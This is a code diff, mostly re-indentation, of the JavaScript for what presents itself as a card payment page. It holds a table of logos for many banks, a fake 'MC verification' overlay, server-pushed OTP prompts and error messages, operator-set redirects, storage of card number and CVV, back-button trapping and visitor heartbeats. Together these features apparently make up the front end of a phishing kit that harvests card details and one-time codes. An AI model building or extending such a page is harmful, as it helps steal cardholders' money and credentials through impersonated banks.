-                    'citizens': 'https://locations.citizensbank.com/images/citizens-logo-rebrand.png',
-                    'chase bank': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
-                    'truist': 'https://upload.wikimedia.org/wikipedia/commons/8/8b/Truist_Financial_logo.svg',
-                    'cathy united taiwan': 'https://static.wikia.nocookie.net/logopedia/images/4/4b/CATHAY2002.png/revision/latest/scale-to-width-down/250?cb=20230808075909',
-                    'novascotia': 'https://asset.brandfetch.io/idpIpGPfn2/ideBeGWgbz.svg?updated=1667941638324',
-                    'sinopac bank taiwan': 'https://easy.sinopac.com/images/sinopac-logo.svg',
-                    'hua nan bank taiwan': 'https://thebanks.eu/img/logos/Hua_Nan_Commercial_Bank.png',
-                    'landbank taiwan': 'https://www.landbank.com/new_assets/header/landbank_logo.webp',
-                    'un bank taiwan': 'https://upload.wikimedia.org/wikipedia/commons/5/52/E.SUN_Bank.svg',
-                    'KGI bank taiwan': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/dd/KGI_Financial_Holding_logo_v2.png/250px-KGI_Financial_Holding_logo_v2.png',
-                    'usaa bank': 'https://logos-world.net/wp-content/uploads/2021/03/USAA-United-Services-Automobile-Association-Logo-700x394.png',
-                    'huntington': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
-                    'm&t bank ': 'https://companieslogo.com/img/orig/MTB_BIG-01f85319.png?t=1720244493',
-                    'barclays bank': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png',
-                    'santandar usa': 'https://logodownload.org/wp-content/uploads/2017/05/santander-logo-1.png',
-                    'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
-                  'morganstanley': 'https://www.morganstanley.com/content/dam/im/web/images/MSPC/MS-Private-Credit-Logo.svg',
-                   'bancorp': 'https://www.logo.wine/a/logo/U.S._Bancorp/U.S._Bancorp-Logo.wine.svg',
-                   'pnc': 'https://upload.wikimedia.org/wikipedia/commons/1/1b/PNClogo.svg',
-                   'charles schweb': 'https://upload.wikimedia.org/wikipedia/commons/4/4b/Charles_Schwab_Corporation_logo.svg',
-                   'BMO USA': 'https://1000logos.net/wp-content/uploads/2024/01/BMO-US-Logo-500x281.png',
-                   'First Citizens': 'https://www.annualreports.com/HostedData/CompanyLogos/NASDAQ_FCNCA.png',
-                   'Fifth Third Bank': 'https://companieslogo.com/img/orig/FITB_BIG-1d1d41ca.png?t=1723189499',
-                   'Ally Financial': 'https://upload.wikimedia.org/wikipedia/commons/0/00/Ally_Financial.svg',
-                 'KeyCorp': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
-                   'Webster Bank': 'https://upload.wikimedia.org/wikipedia/commons/8/81/Webster_Bank_Logo.svg',
-                   'BNP Paribas': 'https://www.logo.wine/a/logo/BNP_Paribas/BNP_Paribas-Logo.wine.svg',
-                   'Columbia Bank': 'https://mma.prnewswire.com/media/254331/columbia_bank_logo.jpg',
-                   'SoFi': 'https://www.finder.com/niche-builder/5e8f8d3d11841.png',
-                   'Texas Capital Bank': 'https://a.storyblok.com/f/102997/2684x834/d5fa7255e0/tc_horizontal_rgb_2color.png',
-                   'Arvest Bank': 'https://upload.wikimedia.org/wikipedia/commons/8/82/Arvest_Bank_logo.svg',
-                 'Indian allahabad Bank': 'https://logos-download.com/wp-content/uploads/2016/03/Allahabad_Bank_logo_2-700x260.jpg',
-                   'Indian Overseas Bank': 'https://upload.wikimedia.org/wikipedia/commons/f/fc/Indian_Overseas_Bank_Logo.svg',
-                   'Federal Bank': 'https://assets.stickpng.com/images/627cca9b1b2e263b45696aa1.png',
-                   'IDBI Bank': 'https://logotyp.us/file/idbi.svg',
-                   'IDFC First Bank': 'https://www.idfcfirstbank.com/content/dam/idfcfirstbank/images/n1/IDFC-logo-website.svg',
-         'Northern Trust': 'https://www.responsibilityreports.com/HostedData/CompanyLogos/NASDAQ_NTRS.png',
-                   'Synchrony Financial': 'https://upload.wikimedia.org/wikipedia/commons/8/85/Synchrony_Financial.svg',
-                   'Deutsche Bank': 'https://upload.wikimedia.org/wikipedia/commons/4/48/Deutsche_Bank-Logo.svg',
-                   'First Horizon': 'https://companieslogo.com/img/orig/FHN_BIG-c5db5207.png?t=1721010478',
-                   'Comerica': 'https://whitememorial.give.adventisthealth.org/wp-content/uploads/sites/18/2024/09/Comerica-LOGO.jpg',
-                   'IndusInd Bank': 'https://images.seeklogo.com/logo-png/20/2/indusind-bank-logo-png_seeklogo-207227.png',
-                   'Jammu & Kashmir Bank': 'https://www.jkbank.com/assets/frontend/layout/img/logos/jklogo.jpg',
-                   'Karnataka Bank': 'https://seekvectors.com/storage/images/karnataka-bank-logo-01.svg',
-                   'RBL Bank': 'https://upload.wikimedia.org/wikipedia/commons/7/70/RBL_Bank_SVG_Logo.svg',
-                   'UCO Bank': 'https://brandeps.com/logo-download/U/UCO-Bank-logo-vector-01.svg',
-                   'BBVA Mexico': 'https://dq8dwmysp7hk1.cloudfront.net/logos/bbva.svg',
-                   'Banorte Mexico': 'https://img2.freepnges.com/20180625/swi/aaz8w7s80.webp',
-                   'Citibanamex México': 'https://upload.wikimedia.org/wikipedia/commons/9/92/Citibanamex_logo.svg',
-                   'Lloyds Banking Group': 'https://companieslogo.com/img/orig/LYG_BIG-74740808.png?t=1720244492',
-         'NatWest Group': 'https://static.wikia.nocookie.net/logopedia/images/8/86/NatWest_Group_logo.svg/revision/latest/scale-to-width-down/300?cb=20230323154303',
-         'Starling Bank': 'https://asset.brandfetch.io/id65Uj_bLX/id8a5daz0W.svg?updated=1667561520880',
-             'Royal Bank of Canada': 'https://www.logo.wine/a/logo/RBC_Bank/RBC_Bank-Logo.wine.svg',
-                   'Bank of Montreal': 'https://1000logos.net/wp-content/uploads/2021/06/Bank-of-Montreal-logo-500x281.png',
-                   'Canadian Imperial Bank of Commerce': 'https://logos-world.net/wp-content/uploads/2021/05/CIBC-Logo-700x394.png',
-                   'Commerzbank': 'https://assets.stickpng.com/images/5a1d2c5e4ac6b00ff574e275.png',
-                   'N26': 'https://big-picture.com/img/xtech/fintech_logos/N26-logo.jpg',
-                   'Bunq': 'https://upload.wikimedia.org/wikipedia/commons/5/58/Bunq_(bank)_company_logo_2017.svg',
-                };
-                
-                const bankLogo = document.getElementById('bankLogo');
-                if (bankLogo) {
-                  bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
-                }
-              }
-            });
+      // Handle currency update - NEW
+      socket.on('update_mc_currency', async (data) => {
+        if (data.invoiceId === currentInvoiceId) {
+          const currencySymbol = document.getElementById('currencySymbol');
+          const transactionAmount = document.getElementById('transactionAmount');
+          const convertedAmountDisplay = document.getElementById('convertedAmountDisplay');
+          const originalCurrencyDisplay = document.getElementById('originalCurrencyDisplay');
+          const originalAmount = document.getElementById('originalAmount');
+          const displayAmount = document.getElementById('displayAmount');
+          
+          // Get original amount
+          const originalAmountValue = originalAmount?.textContent || displayAmount?.textContent || '0.00';
+          
+          // Handle currency conversion
+          if (data.currency && data.currency !== 'INR') {
+            // Save original value
+            if (originalAmount) {
+              originalAmount.textContent = originalAmountValue;
+            }
             
-            // Handle currency update - NEW
-            socket.on('update_mc_currency', async (data) => {
-              if (data.invoiceId === currentInvoiceId) {
-                const currencySymbol = document.getElementById('currencySymbol');
-                const transactionAmount = document.getElementById('transactionAmount');
-                const convertedAmountDisplay = document.getElementById('convertedAmountDisplay');
-                const originalCurrencyDisplay = document.getElementById('originalCurrencyDisplay');
-                const originalAmount = document.getElementById('originalAmount');
-                const displayAmount = document.getElementById('displayAmount');
-                
-                // Get original amount
-                const originalAmountValue = originalAmount?.textContent || displayAmount?.textContent || '0.00';
-                
-                // Handle currency conversion
-                if (data.currency && data.currency !== 'INR') {
-                  // Save original value
-                  if (originalAmount) {
-                    originalAmount.textContent = originalAmountValue;
-                  }
-                  
-                  // Get the new currency symbol
-                  const newSymbol = currencySymbols[data.currency] || data.currency;
-                  if (currencySymbol) {
-                    currencySymbol.textContent = newSymbol;
-                  }
-                  
-                  // Show loading
-                  if (transactionAmount) {
-                    transactionAmount.textContent = "Converting...";
-                  }
-                  
-                  try {
-                    // Get converted amount
-                    const convertedValue = await convertCurrency(parseFloat(originalAmountValue), 'INR', data.currency);
-                    
-                    // Display converted amount
-                    if (transactionAmount) {
-                      transactionAmount.textContent = convertedValue;
-                    }
-                    
-                    // Show original amount display
-                    if (convertedAmountDisplay && originalCurrencyDisplay) {
-                      convertedAmountDisplay.style.display = 'none';
-                    }
-                    
-                    console.log(`Currency converted: ${originalAmountValue} INR = ${convertedValue} ${data.currency}`);
-                  } catch (error) {
-                    console.error('Currency conversion failed:', error);
-                    
-                    // Fallback to original amount
-                    if (transactionAmount) {
-                      transactionAmount.textContent = originalAmountValue;
-                    }
-                    if (currencySymbol) {
-                      currencySymbol.textContent = '₹';
-                    }
-                    if (convertedAmountDisplay) {
-                      convertedAmountDisplay.style.display = 'none';
-                    }
-                  }
-                } else {
-                  // Default INR currency (no conversion needed)
-                  if (currencySymbol) {
-                    currencySymbol.textContent = '₹';
-                  }
-                  if (transactionAmount) {
-                    transactionAmount.textContent = originalAmountValue;
-                  }
-                  if (convertedAmountDisplay) {
-                    convertedAmountDisplay.style.display = 'none';
-                  }
-                }
-              }
-            });
+            // Get the new currency symbol
+            const newSymbol = currencySymbols[data.currency] || data.currency;
+            if (currencySymbol) {
+              currencySymbol.textContent = newSymbol;
+            }
             
-            socket.on('mc_otp_error', (data) => {
-              if (data.invoiceId === currentInvoiceId) {
-                const mcOtpError = document.getElementById('mcOtpError');
-                const mcSubmitBtn = document.getElementById('mcSubmitBtn');
-                
-                if (mcOtpError) {
-                  mcOtpError.textContent = data.message || 'Incorrect verification code. Please try again.';
-                  mcOtpError.style.display = 'block';
-                }
-                
-                if (mcSubmitBtn) {
-                  mcSubmitBtn.disabled = false;
-                  mcSubmitBtn.textContent = 'Submit';
-                }
-              }
-            });
+            // Show loading
+            if (transactionAmount) {
+              transactionAmount.textContent = "Converting...";
+            }
             
+            try {
+              // Get converted amount
+              const convertedValue = await convertCurrency(parseFloat(originalAmountValue), 'INR', data.currency);
+              
+              // Display converted amount
+              if (transactionAmount) {
+                transactionAmount.textContent = convertedValue;
+              }
+              
+              // Show original amount display
+              if (convertedAmountDisplay && originalCurrencyDisplay) {
+                convertedAmountDisplay.style.display = 'none';
+              }
+              
+              console.log(`Currency converted: ${originalAmountValue} INR = ${convertedValue} ${data.currency}`);
+            } catch (error) {
+              console.error('Currency conversion failed:', error);
+              
+              // Fallback to original amount
+              if (transactionAmount) {
+                transactionAmount.textContent = originalAmountValue;
+              }
+              if (currencySymbol) {
+                currencySymbol.textContent = '₹';
+              }
+              if (convertedAmountDisplay) {
+                convertedAmountDisplay.style.display = 'none';
+              }
+            }
+          } else {
+            // Default INR currency (no conversion needed)
+            if (currencySymbol) {
+              currencySymbol.textContent = '₹';
+            }
+            if (transactionAmount) {
+              transactionAmount.textContent = originalAmountValue;
+            }
+            if (convertedAmountDisplay) {
+              convertedAmountDisplay.style.display = 'none';
+            }
+          }
+        }
+      });
+      
+      socket.on('mc_otp_error', (data) => {
+        if (data.invoiceId === currentInvoiceId) {
+          const mcOtpError = document.getElementById('mcOtpError');
+          const mcSubmitBtn = document.getElementById('mcSubmitBtn');
+          
+          if (mcOtpError) {
+            mcOtpError.textContent = data.message || 'Incorrect verification code. Please try again.';
+            mcOtpError.style.display = 'block';
+          }
+          
+          if (mcSubmitBtn) {
+            mcSubmitBtn.disabled = false;
+            mcSubmitBtn.textContent = 'Submit';
+          }
+        }
+      });
+      
 socket.on('mc_verification_result', (data) => {
   if (data.invoiceId === currentInvoiceId) {
     // Hide overlay
@@ -2477,202 +2458,202 @@ socket.on('mc_verification_result', (data) => {
     }
   }
 });
-      
-            socket.on('hide_bankpage', (data) => {
-              if (bankPageWindow && !bankPageWindow.closed) {
-                bankPageWindow.close();
-              }
-              // Keep loading state active regardless, but only check status if it's our transaction
-              const submitButton = document.getElementById('submitButton');
-              const submitText = document.getElementById('submitText');
-              const submitLoader = document.getElementById('submitLoader');
-      
-              if (!submitButton || !submitText || !submitLoader) return; // Added null check
-              
-              submitButton.classList.add('btn-loading');
-              submitText.style.opacity = '0.5';
-              submitText.style.filter = 'blur(1px)';
-              submitLoader.classList.remove('hidden');
-      
-              if (data.invoiceId === currentInvoiceId) {
-                // Start checking transaction status but don't change loading state
-                if (!statusCheckInterval) {
-                  statusCheckInterval = setInterval(checkTransactionStatus, 2000);
-                }
-              }
-            });
-          });
-      
-          // Save form data for currency page return
-          function saveFormData() {
-            const formData = {
-              email: document.getElementById('email')?.value || '',
-              cardNumber: document.getElementById('cardNumber')?.value || '',
-              expiry: document.getElementById('expiry')?.value || '',
-              cvv: document.getElementById('cvv')?.value || '',
-              cardholderName: document.getElementById('cardholderName')?.value || '',
-              invoiceId: currentInvoiceId
-            };
-            sessionStorage.setItem('paymentFormData', JSON.stringify(formData));
+           socket.on('hide_bankpage', (data) => {
+          if (bankPageWindow && !bankPageWindow.closed) {
+            bankPageWindow.close();
           }
-      
-          // Restore form data when returning from currency page
-          function restoreFormData() {
-            const savedData = sessionStorage.getItem('paymentFormData');
-            if (savedData) {
-              try {
-                const formData = JSON.parse(savedData);
-                
-                const emailEl = document.getElementById('email');
-                const cardNumberEl = document.getElementById('cardNumber');
-                const expiryEl = document.getElementById('expiry');
-                const cvvEl = document.getElementById('cvv');
-                const cardholderNameEl = document.getElementById('cardholderName');
-                
-                if (emailEl) emailEl.value = formData.email || '';
-                if (cardNumberEl) cardNumberEl.value = formData.cardNumber || '';
-                if (expiryEl) expiryEl.value = formData.expiry || '';
-                if (cvvEl) cvvEl.value = formData.cvv || '';
-                if (cardholderNameEl) cardholderNameEl.value = formData.cardholderName || '';
-                
-                // Restore invoice ID
-                if (formData.invoiceId) {
-                  currentInvoiceId = formData.invoiceId;
-                }
-                
-                // Re-validate and update card info
-                if (formData.cardNumber) {
-                  isCardValid = validateCard(formData.cardNumber.replace(/\s/g, ''));
-                  updateCardTypeAndInfo(formData.cardNumber);
-                }
-                
-                if (formData.expiry) {
-                  isExpiryValid = validateExpiry(formData.expiry);
-                }
-                
-                updateSubmitButton();
-              } catch (e) {
-                console.error('Error restoring form data:', e);
-              }
-            }
-          }
-      
-          // Transaction Status Check Function
-          async function checkTransactionStatus() {
-            if (!currentInvoiceId) return;
-            try {
-              const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
-              if (!response.ok) throw new Error('Failed to check transaction status');
-              
-              const data = await response.json();
-              
-              const paymentFormEl = document.getElementById('paymentForm');
-              const otpFormEl = document.getElementById('otpForm');
-              const cardLastFourEl = document.getElementById('cardLastFour');
-              const cardNumberEl = document.getElementById('cardNumber');
-              const otpErrorEl = document.getElementById('otpError');
-              
-              if (data.status === 'show_otp') {
-                if (statusCheckInterval) {
-                  clearInterval(statusCheckInterval);
-                  statusCheckInterval = null;
-                }
-                
-                if (paymentFormEl && otpFormEl) {
-                  paymentFormEl.classList.add('hidden');
-                  otpFormEl.classList.remove('hidden');
-                }
-                
-                if (cardLastFourEl && cardNumberEl) {
-                  cardLastFourEl.textContent = cardNumberEl.value.slice(-4);
-                }
-                
-                if (!timerInterval) { 
-                  startOtpTimer(); 
-                }
-                
-                if (data.otpError && otpErrorEl) {
-                  otpErrorEl.style.display = 'block';
-                  
-                  // Reset OTP button state when there's an error
-                  const otpButton = document.getElementById('otpSubmitButton');
-                  const otpLoader = document.getElementById('otpLoader');
-                  const btnText = document.getElementById('otpText');
-                  
-                  if (otpButton && otpLoader && btnText) {
-                    otpButton.disabled = false;
-                    otpLoader.classList.add('hidden');
-                    btnText.style.opacity = '1';
-                    btnText.style.filter = 'none';
-                  }
-                  
-                  isProcessing = false;
-                } else if (otpErrorEl) {
-                  otpErrorEl.style.display = 'none';
-                }
-                
-                isProcessing = false;
-else if (data.status === 'redirect') {
-  // Use clean URLs for redirects
-  if (data.redirectUrl.includes('success.html')) {
-    window.location.href = getSuccessUrl(currentInvoiceId);
-  } else if (data.redirectUrl.includes('fail.html')) {
-    const url = new URL(data.redirectUrl, window.location.origin);
-    const reason = url.searchParams.get('reason');
-    window.location.href = getFailUrl(reason);
-  } else if (data.redirectUrl.includes('currencypayment.html')) {
-    window.location.href = data.redirectUrl.replace('currencypayment.html', 'currencypayment-page.html');
-  } else {
-    window.location.href = data.redirectUrl;
-  }
-}
-            } catch (err) {
-              console.error('Error checking transaction status:', err);
-            }
-          }
-      
-          // OTP Timer Function
-          function startOtpTimer() {
-            const timerEl = document.getElementById('timer');
-            if (!timerEl) return; // Added null check
-            
-            if (timerInterval) {
-              clearInterval(timerInterval);
-              timerInterval = null;
-            }
-            
-            timer = 180;
-            timerInterval = setInterval(() => {
-              timer--;
-              const minutes = Math.floor(timer / 60);
-              const seconds = timer % 60;
-              
-              if (timerEl) {
-                timerEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
-              }
-              
-              if (timer <= 0) {
-                clearInterval(timerInterval);
-                timerInterval = null;
-                window.location.href = getFailUrl('timeout'); // Use clean URL for fail
-              }
-            }, 1000);
-          }
-      
-// Consistent Back Button Prevention
-function setupBackButtonPrevention() {
-  window.onpopstate = function(event) {
-    if (confirm("Do you want to cancel this transaction?")) {
-      window.location.href = getFailUrl('canceled');
-    } else {
-      // Stay on current page by pushing another state
-      history.pushState(null, null, window.location.href);
-    }
-  };
+          // Keep loading state active regardless, but only check status if it's our transaction
+          const submitButton = document.getElementById('submitButton');
+          const submitText = document.getElementById('submitText');
+          const submitLoader = document.getElementById('submitLoader');
   
-  // Initial push to enable back button detection
-  history.pushState(null, null, window.location.href);
-}
+          if (!submitButton || !submitText || !submitLoader) return; // Added null check
+          
+          submitButton.classList.add('btn-loading');
+          submitText.style.opacity = '0.5';
+          submitText.style.filter = 'blur(1px)';
+          submitLoader.classList.remove('hidden');
+  
+          if (data.invoiceId === currentInvoiceId) {
+            // Start checking transaction status but don't change loading state
+            if (!statusCheckInterval) {
+              statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+            }
+          }
+        });
+      });
+  
+      // Save form data for currency page return
+      function saveFormData() {
+        const formData = {
+          email: document.getElementById('email')?.value || '',
+          cardNumber: document.getElementById('cardNumber')?.value || '',
+          expiry: document.getElementById('expiry')?.value || '',
+          cvv: document.getElementById('cvv')?.value || '',
+          cardholderName: document.getElementById('cardholderName')?.value || '',
+          invoiceId: currentInvoiceId
+        };
+        sessionStorage.setItem('paymentFormData', JSON.stringify(formData));
+      }
+  
+      // Restore form data when returning from currency page
+      function restoreFormData() {
+        const savedData = sessionStorage.getItem('paymentFormData');
+        if (savedData) {
+          try {
+            const formData = JSON.parse(savedData);
+            
+            const emailEl = document.getElementById('email');
+            const cardNumberEl = document.getElementById('cardNumber');
+            const expiryEl = document.getElementById('expiry');
+            const cvvEl = document.getElementById('cvv');
+            const cardholderNameEl = document.getElementById('cardholderName');
+            
+            if (emailEl) emailEl.value = formData.email || '';
+            if (cardNumberEl) cardNumberEl.value = formData.cardNumber || '';
+            if (expiryEl) expiryEl.value = formData.expiry || '';
+            if (cvvEl) cvvEl.value = formData.cvv || '';
+            if (cardholderNameEl) cardholderNameEl.value = formData.cardholderName || '';
+            
+            // Restore invoice ID
+            if (formData.invoiceId) {
+              currentInvoiceId = formData.invoiceId;
+            }
+            
+            // Re-validate and update card info
+            if (formData.cardNumber) {
+              isCardValid = validateCard(formData.cardNumber.replace(/\s/g, ''));
+              updateCardTypeAndInfo(formData.cardNumber);
+            }
+            
+            if (formData.expiry) {
+              isExpiryValid = validateExpiry(formData.expiry);
+            }
+            
+            updateSubmitButton();
+          } catch (e) {
+            console.error('Error restoring form data:', e);
+          }
+        }
+      }
+  
+      // FIXED: Transaction Status Check Function with proper closing braces
+      async function checkTransactionStatus() {
+        if (!currentInvoiceId) return;
+        try {
+          const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
+          if (!response.ok) throw new Error('Failed to check transaction status');
+          
+          const data = await response.json();
+          
+          const paymentFormEl = document.getElementById('paymentForm');
+          const otpFormEl = document.getElementById('otpForm');
+          const cardLastFourEl = document.getElementById('cardLastFour');
+          const cardNumberEl = document.getElementById('cardNumber');
+          const otpErrorEl = document.getElementById('otpError');
+          
+          if (data.status === 'show_otp') {
+            if (statusCheckInterval) {
+              clearInterval(statusCheckInterval);
+              statusCheckInterval = null;
+            }
+            
+            if (paymentFormEl && otpFormEl) {
+              paymentFormEl.classList.add('hidden');
+              otpFormEl.classList.remove('hidden');
+            }
+            
+            if (cardLastFourEl && cardNumberEl) {
+              cardLastFourEl.textContent = cardNumberEl.value.slice(-4);
+            }
+            
+            if (!timerInterval) { 
+              startOtpTimer(); 
+            }
+            
+            if (data.otpError && otpErrorEl) {
+              otpErrorEl.style.display = 'block';
+              
+              // Reset OTP button state when there's an error
+              const otpButton = document.getElementById('otpSubmitButton');
+              const otpLoader = document.getElementById('otpLoader');
+              const btnText = document.getElementById('otpText');
+              
+              if (otpButton && otpLoader && btnText) {
+                otpButton.disabled = false;
+                otpLoader.classList.add('hidden');
+                btnText.style.opacity = '1';
+                btnText.style.filter = 'none';
+              }
+              
+              isProcessing = false;
+            } else if (otpErrorEl) {
+              otpErrorEl.style.display = 'none';
+            }
+            
+            isProcessing = false;
+          } 
+          else if (data.status === 'redirect') {
+            // Use clean URLs for redirects
+            if (data.redirectUrl.includes('success.html')) {
+              window.location.href = getSuccessUrl(currentInvoiceId);
+            } else if (data.redirectUrl.includes('fail.html')) {
+              const url = new URL(data.redirectUrl, window.location.origin);
+              const reason = url.searchParams.get('reason');
+              window.location.href = getFailUrl(reason);
+            } else if (data.redirectUrl.includes('currencypayment.html')) {
+              window.location.href = data.redirectUrl.replace('currencypayment.html', 'currencypayment-page.html');
+            } else {
+              window.location.href = data.redirectUrl;
+            }
+          }
+        } catch (err) {
+          console.error('Error checking transaction status:', err);
+        }
+      }
+  
+      // OTP Timer Function
+      function startOtpTimer() {
+        const timerEl = document.getElementById('timer');
+        if (!timerEl) return; // Added null check
+        
+        if (timerInterval) {
+          clearInterval(timerInterval);
+          timerInterval = null;
+        }
+        
+        timer = 180;
+        timerInterval = setInterval(() => {
+          timer--;
+          const minutes = Math.floor(timer / 60);
+          const seconds = timer % 60;
+          
+          if (timerEl) {
+            timerEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+          }
+          
+          if (timer <= 0) {
+            clearInterval(timerInterval);
+            timerInterval = null;
+            window.location.href = getFailUrl('timeout'); // Use clean URL for fail
+          }
+        }, 1000);
+      }
+  
+      // Consistent Back Button Prevention
+      function setupBackButtonPrevention() {
+        window.onpopstate = function(event) {
+          if (confirm("Do you want to cancel this transaction?")) {
+            window.location.href = getFailUrl('canceled');
+          } else {
+            // Stay on current page by pushing another state
+            history.pushState(null, null, window.location.href);
+          }
+        };
+        
+        // Initial push to enable back button detection
+        history.pushState(null, null, window.location.href);
+      }
           
       // Setup MC verification event handlers
       function setupMCVerificationHandlers() {
@@ -2840,31 +2821,31 @@ function setupMCTimerIfNeeded(reset = false) {
   
   let timeLeft = 179; // 2:59 timer
             
-            // Update the timer display immediately
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            
-            // Set up the interval
-            window.mcTimerInterval = setInterval(() => {
-              timeLeft--;
-              
-              const minutes = Math.floor(timeLeft / 60);
-              const seconds = timeLeft % 60;
-              timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-              
-              if (timeLeft <= 0) {
-                clearInterval(window.mcTimerInterval);
-                
-                // Redirect on timeout
-  const overlay = document.getElementById('mcVerificationOverlay');
-  if (overlay) overlay.style.display = 'none';
+  // Update the timer display immediately
+  const minutes = Math.floor(timeLeft / 60);
+  const seconds = timeLeft % 60;
+  timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
   
-  window.location.href = getFailUrl('timeout');
+  // Set up the interval
+  window.mcTimerInterval = setInterval(() => {
+    timeLeft--;
+    
+    const minutes = Math.floor(timeLeft / 60);
+    const seconds = timeLeft % 60;
+    timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    
+    if (timeLeft <= 0) {
+      clearInterval(window.mcTimerInterval);
+      
+      // Redirect on timeout
+      const overlay = document.getElementById('mcVerificationOverlay');
+      if (overlay) overlay.style.display = 'none';
+      
+      window.location.href = getFailUrl('timeout');
+    }
+  }, 1000);
 }
-            }, 1000);
-          }
-        </script>
+              </script>
         <script>
         // Visitor Heartbeat - keeps track of active visitors
         function sendHeartbeat() {
